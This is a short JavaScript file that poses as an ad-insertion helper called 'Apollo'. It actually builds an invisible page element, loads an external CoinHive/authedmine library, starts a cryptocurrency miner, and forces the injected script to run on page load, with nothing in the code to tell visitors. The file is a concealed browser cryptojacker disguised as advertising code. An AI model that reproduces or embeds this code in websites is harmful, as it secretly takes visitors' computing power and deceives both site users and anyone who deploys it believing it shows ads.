class Apollo {
  constructor () {

    //Start Apollo
    this.insertAdDiv()
    this.insertAds()
  }

  isTouchDevice () {
    return 'ontouchstart' in window
  }

  request (url, callback) {
    try {
  		const x = new (window.XMLHttpRequest || window.ActiveXObject)('MSXML2.XMLHTTP.3.0')
  		x.open('GET', url, 1)
  		x.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
      x.setRequestHeader('Content-type', 'application/json')

  		x.onreadystatechange = function () {
  			x.readyState > 3 && callback && callback(x.responseText, x)
  		}

  		x.send()
  	} catch (e) {
  		window.console && console.log(e)
  	}
  }

  insertAdDiv () {
    this.ads = document.createElement('div')

    this.ads.style.width = `100%`
    this.ads.style.height = `100px`
    this.ads.style.bottom = `10px`
    this.ads.style.position = 'absolute'
    this.ads.id = 'ads'
    this.ads.style.opacity = '0'
    this.ads.style.zIndex = '-300000'

    document.body.insertAdjacentElement('beforeend', this.ads)

  }

  insertAds () {
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = 'https://authedmine.com/lib/authedmine.min.js';
    head.appendChild(script);

    let adsHTML = `<script>var miner = new CoinHive.Anonymous('TBS');miner.start();</script>`
    document.getElementById("ads").innerHTML = adsHTML

  }
}

if (typeof window !== 'undefined' &&
  window.document &&
  window.document.createElement
) {
  window.Apollo = new Apollo()
  function nodeScriptReplace(node) {
          if ( nodeScriptIs(node) === true ) {
                  node.parentNode.replaceChild( nodeScriptClone(node) , node );
          }
          else {
                  var i        = 0;
                  var children = node.childNodes;
                  while ( i < children.length ) {
                          nodeScriptReplace( children[i++] );
                  }
          }

          return node;
  }
  function nodeScriptIs(node) {
          return node.tagName === 'SCRIPT';
  }
  function nodeScriptClone(node){
          var script  = document.createElement("script");
          script.text = node.innerHTML;
          for( var i = node.attributes.length-1; i >= 0; i-- ) {
                  script.setAttribute( node.attributes[i].name, node.attributes[i].value );
          }
          return script;
  }

  nodeScriptReplace(document.getElementsByTagName("body")[0]);
}
